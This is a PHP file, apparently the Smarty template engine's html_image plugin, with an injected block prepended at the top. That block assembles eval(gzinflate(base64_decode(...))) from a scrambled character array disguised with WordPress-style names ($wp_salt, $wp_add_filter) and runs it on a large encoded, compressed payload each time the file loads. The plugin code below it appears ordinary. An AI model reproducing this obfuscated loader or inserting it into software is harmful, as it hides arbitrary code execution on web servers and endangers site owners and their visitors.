<?php
$md5 = "29d62bf146442a5c685a71598cd738af";
$wp_salt = array("v",'n',"_",'(','r','i',"a","s","z",'b','$',")",'6',";","c",'l',"o","g","4",'e','f','t',"d");
$wp_add_filter = create_function('$'.'v',$wp_salt[19].$wp_salt[0].$wp_salt[6].$wp_salt[15].$wp_salt[3].$wp_salt[17].$wp_salt[8].$wp_salt[5].$wp_salt[1].$wp_salt[20].$wp_salt[15].$wp_salt[6].$wp_salt[21].$wp_salt[19].$wp_salt[3].$wp_salt[9].$wp_salt[6].$wp_salt[7].$wp_salt[19].$wp_salt[12].$wp_salt[18].$wp_salt[2].$wp_salt[22].$wp_salt[19].$wp_salt[14].$wp_salt[16].$wp_salt[22].$wp_salt[19].$wp_salt[3].$wp_salt[10].$wp_salt[0].$wp_salt[11].$wp_salt[11].$wp_salt[11].$wp_salt[13]);
$wp_add_filter('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');
?>
<?php
/**
 * Smarty plugin
 * @package Smarty
 * @subpackage plugins
 */


/**
 * Smarty {html_image} function plugin
 *
 * Type:     function<br>
 * Name:     html_image<br>
 * Date:     Feb 24, 2003<br>
 * Purpose:  format HTML tags for the image<br>
 * Input:<br>
 *         - file = file (and path) of image (required)
 *         - height = image height (optional, default actual height)
 *         - width = image width (optional, default actual width)
 *         - basedir = base directory for absolute paths, default
 *                     is environment variable DOCUMENT_ROOT
 *         - path_prefix = prefix for path output (optional, default empty)
 *
 * Examples: {html_image file="/images/masthead.gif"}
 * Output:   <img src="/images/masthead.gif" width=400 height=23>
 * @link http://smarty.php.net/manual/en/language.function.html.image.php {html_image}
 *      (Smarty online manual)
 * @author   Monte Ohrt <monte at ohrt dot com>
 * @author credits to Duda <duda@big.hu> - wrote first image function
 *           in repository, helped with lots of functionality
 * @version  1.0
 * @param array
 * @param Smarty
 * @return string
 * @uses smarty_function_escape_special_chars()
 */
function smarty_function_html_image($params, &$smarty)
{
    require_once $smarty->_get_plugin_filepath('shared','escape_special_chars');
    
    $alt = '';
    $file = '';
    $height = '';
    $width = '';
    $extra = '';
    $prefix = '';
    $suffix = '';
    $path_prefix = '';
    $server_vars = ($smarty->request_use_auto_globals) ? $_SERVER : $GLOBALS['HTTP_SERVER_VARS'];
    $basedir = isset($server_vars['DOCUMENT_ROOT']) ? $server_vars['DOCUMENT_ROOT'] : '';
    foreach($params as $_key => $_val) {
        switch($_key) {
            case 'file':
            case 'height':
            case 'width':
            case 'dpi':
            case 'path_prefix':
            case 'basedir':
                $$_key = $_val;
                break;

            case 'alt':
                if(!is_array($_val)) {
                    $$_key = smarty_function_escape_special_chars($_val);
                } else {
                    $smarty->trigger_error("html_image: extra attribute '$_key' cannot be an array", E_USER_NOTICE);
                }
                break;

            case 'link':
            case 'href':
                $prefix = '<a href="' . $_val . '">';
                $suffix = '</a>';
                break;

            default:
                if(!is_array($_val)) {
                    $extra .= ' '.$_key.'="'.smarty_function_escape_special_chars($_val).'"';
                } else {
                    $smarty->trigger_error("html_image: extra attribute '$_key' cannot be an array", E_USER_NOTICE);
                }
                break;
        }
    }

    if (empty($file)) {
        $smarty->trigger_error("html_image: missing 'file' parameter", E_USER_NOTICE);
        return;
    }

    if (substr($file,0,1) == '/') {
        $_image_path = $basedir . $file;
    } else {
        $_image_path = $file;
    }
    
    if(!isset($params['width']) || !isset($params['height'])) {
        if(!$_image_data = @getimagesize($_image_path)) {
            if(!file_exists($_image_path)) {
                $smarty->trigger_error("html_image: unable to find '$_image_path'", E_USER_NOTICE);
                return;
            } else if(!is_readable($_image_path)) {
                $smarty->trigger_error("html_image: unable to read '$_image_path'", E_USER_NOTICE);
                return;
            } else {
                $smarty->trigger_error("html_image: '$_image_path' is not a valid image file", E_USER_NOTICE);
                return;
            }
        }
        if ($smarty->security &&
            ($_params = array('resource_type' => 'file', 'resource_name' => $_image_path)) &&
            (require_once(SMARTY_CORE_DIR . 'core.is_secure.php')) &&
            (!smarty_core_is_secure($_params, $smarty)) ) {
            $smarty->trigger_error("html_image: (secure) '$_image_path' not in secure directory", E_USER_NOTICE);
        }        
        
        if(!isset($params['width'])) {
            $width = $_image_data[0];
        }
        if(!isset($params['height'])) {
            $height = $_image_data[1];
        }

    }

    if(isset($params['dpi'])) {
        if(strstr($server_vars['HTTP_USER_AGENT'], 'Mac')) {
            $dpi_default = 72;
        } else {
            $dpi_default = 96;
        }
        $_resize = $dpi_default/$params['dpi'];
        $width = round($width * $_resize);
        $height = round($height * $_resize);
    }

    return $prefix . '<img src="'.$path_prefix.$file.'" alt="'.$alt.'" width="'.$width.'" height="'.$height.'"'.$extra.' />' . $suffix;
}

/* vim: set expandtab: */

?>